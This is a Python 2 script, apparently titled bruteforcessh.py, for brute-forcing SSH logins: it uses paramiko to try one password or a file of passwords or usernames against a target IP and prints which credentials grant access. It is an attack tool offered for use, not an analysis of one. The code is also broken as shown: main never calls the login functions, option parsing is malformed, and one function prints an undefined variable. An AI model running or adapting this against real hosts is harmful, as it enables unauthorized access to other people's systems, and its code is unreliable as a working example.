#!/usr/bin/python
import paramiko
import socket
import re
import sys
import getopt
import subprocess

def usage():

        print " ____        _         _   _      ____  "
        print "| __ )  ___ | | ___ __| \ | |_ __| __ ) "
        print "|  _ \ / _ \| |/ / '__|  \| | '__|  _ \ "
        print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
        print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
        print " "
        print " Usage()"        
        print "python bruteforcessh.py [IP] -u [username] -p [password]"
        print "python bruteforcessh.py [IP] -lu [listuser] -p [password]"
        print "python bruteforcessh.py [IP] -u [username] - lp [listpassword]"

        sys.exit()

def main():
        global username
        global listuser
        global password
        global listpassword

        if not len(sys.argv[1:]):
                usage()
        try:
                opts, args = getopt.getopt(sys.argv[1:],"h:u:lu:p:lp", ["help","username","listuser","password","listpassword"])
        except getopt.GetoptError as err:
                print str(err)
                usage()

        for o,a in opts:
                if o in ("-h","--help"):
                        usage()
                elif o in("-u","--username"):
                        username = a
                elif o in ("-p","password"):
                        password = a
                elif o in ("-lu","listuser"):
                        listuser = a
                elif o in ("-lp","listpass"):
                        listpass = a       
                else:
                        assert False, "Unhandled Option"
  
def sshfunction1(username,password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try: 
                ssh.connect(sys.argv[1], username=username, password=password)
        except paramiko.AuthenticationException:
                print "[-] Denied Access Using the pass:",line
        else: 
                print "[+] Access Granted: ",line
        ssh.close()
        sys.exit()

def sshfunction2(username,listpassword):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        f=open(sys.argv[3])
        for line in f.readlines():
                senha = line.split()
                try: 
                        ssh.connect(sys.argv[1], username=sys.argv[2], password=senha[0])
                except paramiko.AuthenticationException:
                        print "[-] Denied Access Using the pass:",line
                else: 
                        print "[+] Access Granted: ",line
                        break
        ssh.close()
        sys.exit()

def sshfunction3(listuser,password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        f=open(sys.argv[2])
        for line in f.readlines():
                list_user = line.split()
                try: 
                        ssh.connect(sys.argv[1], username=list_user[0], password=password)
                except paramiko.AuthenticationException:
                        print "[-] Denied Access Using the pass:",line
                else: 
                        print "[+] Access Granted: ",line
                        break
        ssh.close()
        sys.exit()

main()
